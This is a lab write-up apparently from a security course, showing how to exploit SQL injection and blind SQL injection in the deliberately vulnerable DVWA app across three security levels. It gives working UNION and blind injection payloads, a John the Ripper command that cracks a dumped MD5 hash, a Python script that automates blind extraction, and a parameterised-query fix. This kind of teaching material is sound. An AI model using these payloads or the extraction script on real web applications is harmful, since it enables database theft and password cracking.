Tutorial 5: SQL Injection Vulnerabilities
=========================================

SQL injection vulnerabilities in `dvwa`
---------------------------------------
Our goal is to exploit the vulnerbilities in the **SQL Injection** category on `dvwa`.

*Security Level: low*

Looking at the source code, we notice the following lines of interest:
```PHP
// Get input
$id = $_REQUEST[ 'id' ];
// Check database
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```
This means that our input into the text field is directly inserted into our SQL command. The only thing we need to worry about are the `''` surrounding `$id`. We can do so with the following query: `a' OR 1; -- `. The `a'` finishes the `user_id = '` part of the query, the `OR 1` ensures we print every row, and finally the `; -- ` finishes our query and comments out the `';` part of the query in the source code. Note that the `--` **must** be followed by a whitespace or it [won't comment](https://dev.mysql.com/doc/refman/8.0/en/comments.html) (one of the quirks of mysql). The `;` isn't actually nneeded for the query to run, but I'd assume it's good practice to include it.

It's also important to note that the web-page only displays the "first_name" and "last_name" columns:
```PHP
while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];
        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
}
```
Therefore, when executing arbitrary SQL queries, we will need to use `AS` clauses to rename the columns we are looking up. Additionally, if we are looking up multiple columns we can use `CONCAT(col1, " ", col_2, etc...) AS first_name`.

Now that we can extract arbitrary data from the database, the first step is to find out more about the table metadata. We can achieve this by querying the `information_schema.columns` table (standard in MySQL) as follows:
`a' UNION SELECT table_schema AS first_name, CONCAT(table_name," ",column_name) AS last_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'; -- `
This reveals the following information:
- `table_schema`- The name of the database to which the table containing the column belongs
- `table_name`- The name of the table containing the column.
- `column_name`- The name of the column.

This allows us to build up a structure of the `dvwa` database:
**dvwa schema**

*guestbook* table, containing:
- comment_id
- comment
- name

*users* table (which we are interseted in), containing:
- user_id
- first_name
- last_name
- user
- password
- avatar
- last_login
- failed_login

**performance_schema schema**

This schema is a [meta-data schema built into MySQL](https://dev.mysql.com/doc/refman/8.0/en/performance-schema.html). This would be useful to filter out in future.

Constructing a query that reveals the password hashes of all users is now quite trivial:
`a' UNION SELECT user AS first_name, password AS last_name FROM users; -- `
*N.B. To make a query that matches the spec exactly, we'd want to use the following query instead `a' UNION SELECT NULL, password AS last_name FROM users; -- `, but I think it's more useful to see the user and password*

This query reveals the information we are looking for, and was stored [**here**](dvwa_user_passwd.txt). From here if we wanted to penetrate the system we could now try using an offline dictionary attack similar to the approach used in lab2. Since the password hashes don't seem to have salts, this should be relatively easy.

*Security Level: medium*

There are a few changes here compared to the previous level. Database queries aree now sent using POST requests instead of being encoded in the GET request query string. The webpage first checks that the database is connected, then uses `mysqli_real_escape_string()` on the input. This function only affects a few characters, notably the `'` and `"` characters, meaning we can't give queries that try to match strings (which is pretty inconvenient). It escapes these characters by adding backslashes to them. In terms of the actual query, `$id` is no longer wrapped in quotes (presumably since we can't use them anymore so we wouldn't be able to escape).

The main change here is how we can actually perform our SQL injections. The UI now only give us predefined options to pick from, so we will need to send edited POST requests (like in tutorial_4). After sending a manual POST response, the response can be viewed by double-clicking it in the Network menu. For a first test, I changed the POST body to `id=0 OR 1 = 1&Submit=Submit`, which as expected printed all the first and last names in the database.

With the information we gathered in the previous difficulty level, using a the following POST body extracts the usernames and passwords: `id=0 UNION SELECT user AS first_name, password AS last_name FROM users&Submit=Submit`. However, if we want to perform the same information gathering as before, our task becomes more difficult as we can no longer filter for the table we are interested in. We can still try and guess table / column names, and if they don't exist we will get an error as a result, or sift through the meta-data manually.

*Security Level: high*

This level seems to be much easier than the previous one, and is essentially a copy of *low*. The only difference is that there is now a `LIMIT 1` at the end of our query, but this can be commented out using the same type of query used in *low*. On the UI side of things, we need to click the link to open the dialog box to change our ID, but this field is free-form so we are free to enter any commands we want. The data is now transferred by a seperate `SESSION`, rather than a GET request, but this does not stop the vulnerability.

Blind SQL injection vulnerabilities in DVWA
-------------------------------------------
Our goal is to exploit the vulnerabilities in DVWA's SQL Injection (Blind) category to obtain the password hash of Gordon Brown (user ID 2).

In this category, we are essentially able to ask YES/NO questions to the web application, which will allow us to recover information 1 bit at a time.

*Security Level: low*

In this case, our input is simply passed in completely unsanitized to the database:
```PHP
// Get input
$id = $_GET[ 'id' ];

// Check database
$getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```
We are also told if the query returns some result of 0 results:
```PHP
// Get results
$num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
if( $num > 0 ) {
    // Feedback for end user
    echo '<pre>User ID exists in the database.</pre>';
}
else {
    // User wasn't found, so the page wasn't!
    header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

    // Feedback for end user
    echo '<pre>User ID is MISSING from the database.</pre>';
}
```
We can therefore formulate a query as follows to ask arbitrary YES/NO questions: `2' AND 1 = 1; -- `. A response of *'User ID exists in the database.'* indicates **TRUE**, and a response of *'User ID is MISSING from the database.'* indicates **FALSE**.

There are a few useful SQL commands for these binary questions:
- `SUBSTRING(string, start, length)`: Allows us to ask about the particular nature of a character in the passwords field, e.g. `SUBSTRING(password, 1, 1) = 'e'` (Note indices start at 1)
- `string LIKE pattern`: Similar to function above, allows us to see if our string matches a particular expression. `%` is the wildcard operator, so for example the string `a%` checks if the word starts with an a.
- `LEN(string)`: Allows us to find the length of the string, lets us know when to stop looking for more characters.

Fromm the previous exercise, we know that the target hash is `e99a18c428cb38d5f260853678922e03`. We can reconstruct this blind using the following queries:
- `2' AND password LIKE 'e%'; -- ` **TRUE**
- `2' AND password LIKE 'e9%'; -- ` **TRUE**
- `2' AND password LIKE 'e99%'; -- ` **TRUE**
etc.
- `2' AND password LIKE 'e99a18c428cb38d5f260853678922e03%'; -- ` **TRUE**
- `2' AND password LIKE 'e99a18c428cb38d5f260853678922e03'; -- ` **TRUE**
We have now confirmed that this is indeed the hash of Gordon Brown. Doing this without the knowledge of the hash would've taken a really long time, so this would normally be done using an automated approach (see [**here**](#automated)). For the remaining vulnerabilitiies, once I demonstrate how to get 1 bit of information I will consider the problem solved and move on.

Now that we have the hash, we want to recover the password using our good friend John. The hash we obtained is a raw MD5 hash. To crack it with john, placed the hash in [hash.txt](hash.txt), which simply contains `gordonb:e99a18c428cb38d5f260853678922e03`. I then ran the command `john --format=raw-md5 --wordlist=/usr/share/dict/wordlist-probable.txt --rules hash.txt`, which specified the format to `raw-md5`. This loaded the hash, but was unable to crack it, meaning that we need a different word list. Kali has a large wordlist available: `rockyou.txt`. To access it, first unzip it using `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`. Running john again using this new wordlist cracks the password:
```
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt
abc123           (gordonb)
```
The password for gordonb is therefore abc123, which works when trying to login! To see the password again after cracking it, you can run `john --show --format=Raw-MD5 hash.txt`.

*Security Level: medium*

The source code here is very similar to the medium level for the non-blind SQL injection. Essentially, we need to change the id as within the body of the POST request using the developer tools, and we need to be careful as `'` and `"` are escaped due to `mysqli_real_escape_string`, so we can no longer use them in our query. In order to get around this, we can use the SQL function `ASCII(character)`, which returns the ASCII value of a character. This way, we can still ask TRUE/FALSE questions to gather information on the contents of the password hash by setting the value of id in the POST body to `2 AND ascii(substring(password, 1, 1)) = 101`. Repeating this for each character in password would let you build up the entire hash.

*Security Level: high*

The code here is also the same as it was for the non-blind SQL injection. We can enter our payload directly into the session window as our input is once again passed in unsanitized. This means we can use any of the approaches outlined above to obtain TRUE/FALSE responses on the contents of the database.

## Questions

1. For both categories, the vulnerable line is as follows:
  - *Low* - Line 8 `$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";`
  - *Medium* - Line 9 `$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";`
  - *High* - Line 8 `$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; `
  They allow untruseted user input (from `$_GET['id']`) to contaminate a SQL query that is then sent to the database erver for execution using PHP's `my sqli_query()` function.

2. In both categories, line 5 of the PHP code for the low security level reads the user ID to be queried from the query string in the URL (`$_GET['id']`). In higher levels, the input is read from different locations that make the SQL injection attack harder: in the medium security levels it is read from the value of the selected option in a `<select>` box in a HTML form (`$_POST['id']`), but the attacker can submit a non-approved value for the id parameter by intercepting and modifying the outgoing HTTP request. The high security levels allow the user to change their user ID — in the SQL Injection category by updating the server-side session data store (`$_SESSION['id']`) and in the SQL Injection (Blind) category by modifying their cookie (`$_COOKIE['id']`) — but the supplied value is never validated before being concatenated with the SQL query that is eventually executed by the database server. Additionally, the PHP code for the high security level in the SQL Injection (Blind) category attempts to frustrate timing attacks by sleeping at random (for at most 4 seconds) when the database query returns an empty table (i.e., when the answer to the “yes/no” question is “no”). This is inadequate because the attack can simply cause the database server to sleep for more than 4 seconds, so that the “no” outcome can still be identified by the attacker.

3. Use parameterised statements to build the SQL query that will be executed, rather than concatenating variables containing untrusted user-supplied input with string literals.
  ```PHP
  $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
  $data->bindParam( ':id', $id, PDO::PARAM_INT );
  $data->execute();
  $row = $data->fetch();
  ```

<a name="automated"></a>Automating blind SQL injection against DVWA
-------------
As mentioned above, asking TRUE/FALSE questions to determine the contents of the password hash would be a very slow and time consuming process. Employing a programatic approach solves this issue. To do this, I wrote a python script (with some serious help from [Bad_Jubies](https://bad-jubies.github.io/Blind-SQLi-1/)). To send HTTP requests in python, we can use the `requests` library. The first issue is that in order to send requests to DVWA, we need to authenticate ourselves first.

To do this, we need to figure out how logging in works. Using the developer tools, we can check what requests are sent: once we login we send a POST request with the following body:
```
username=admin&password=password&Login=Login&user_token=b67680b936ab330d3a6c8e0d81a5ae07
```
We therefore have 3 fields we need to worry about, `username` and `password` (gee I wonder what those are for), and `user_token`, which is a bit less obvious. When inspecting the source code for `login.php` using the developer tools, we notice the following field of interest:
```html
<input type="hidden" name"user_token" value="b67680b936ab330d3a6c8e0d81a5ae07">
```
This is a token used to prevent CSRF (Cross-Site Request Forgery) attacks, and must be sent with the login POST request to be authenticated successfully. Therefore in order to programatically login, we need to find this token in the webpage and attach it to our request. To do this, we note that the token is a 32 character long sequence of lower case alphabetical and numeric characters, so we can use python's regex library `re` to find it. Luckily, this token is the only part of the webpage which matches this regex so we can simply find `r'([a-z,0-9]){32}'`, but if it wasn't we could use a more advanced regex as follows:
```
r"(?<=<input type='hidden' name='user_token' value=')([a-z,0-9]){32}(?=')"
```
This ensures that the token `([a-z,0-9]){32}` is preceeded by `<input type='hidden' name='user_token' value='` and succeeded by `'`. For more information on python regexes see [here](https://docs.python.org/3/library/re.html). With this information, we can now obtain all the information required by our POST request. This is handled in the `login` function, which returns an authenticated session:
```Python
def login(rhost):
    s = requests.session()
    login_url = f"http://{rhost}/dvwa/login.php"
    req = s.get(login_url)
    match = re.search(r"(?<=<input type='hidden' name='user_token' value=')([a-z,0-9]){32}(?=')", req.text)
    token = match.group(0) # Extracts the regex that was matched
    data = {'username':'admin','password':'password','Login':'Login','user_token':token}
    login = s.post(login_url, data=data)
    if "Welcome" in login.text:
        print("login successful")
    return s
```

Once we have authenticataed our session, we can move onto performing our SQL injection. For the initial approach, we loop through every printable ascii character over the length of the password hash in the database (32). Spaces in our query string are replaced with open-close multiline comments `/**/` to prevent our spaces being replaced by `+` or `%20` in our html query (I don't know if this is actually an issue but I do as the guide commands). Once we make our query, we can check if the response is TRUE or FALSE by checking if the response contains `"User ID exists"`. This is done in the `blindSqli` function, which returns the session and the response to our query:
```Python
# Finds characters iterating through all ASCII characters
def blindSqli(rhost, session_object, my_query):
    my_query = my_query.replace(" ", "/**/")
    extracted_data = ""
    for index in range(1,33): # Indices of password hash [1-32]
        for i in range(32, 126): # Loops through all ASCII characcters
            query = f"'/**/or/**/(SELECT/**/ascii(substring(({my_query}),{index},1)))={i}/**/%23"
            r = session_object.get(f"http://{rhost}/dvwa/vulnerabilities/sqli_blind/?id={query}&Submit=Submit#")
            if "User ID exists" in r.text:
                extracted_data += chr(i)
                sys.stdout.write(chr(i))
                sys.stdout.flush()
    return session_object, extracted_data
```

I also re-implemented this function using binary search, which is **significantly** faster than the naive implementation. Essentially, we are looking for a character in the range [32-126], and by reformulating our queries, we can eliminate half this searcch space each query by asking if the target character has a value higher or lower than the midpoint of this range. This was done in the `blindSqliFast` function:
```Python
# Finds characters through binary search of ASCII characters
def blindSqliFast(rhost, session_object, my_query):
    my_query = my_query.replace(" ", "/**/")
    extracted_data = ""
    for index in range(1,33):
        first = 32
        last = 126
        found = False
        while(first != last):
            mid = first + (last - first) // 2 # floor division
            query = f"'/**/or/**/(SELECT/**/ascii(substring(({my_query}),{index},1)))<={mid}/**/%23"
            r = session_object.get(f"http://{rhost}/dvwa/vulnerabilities/sqli_blind/?id={query}&Submit=Submit#")
            if "User ID exists" in r.text:
                last = mid
            else:
                first = mid + 1
        extracted_data += chr(last)
        sys.stdout.write(chr(last))
        sys.stdout.flush()
    return session_object, extracted_data
```

By default, [blind.py](blind.py) uses the faster implementation, but feel free to have a play around with both!
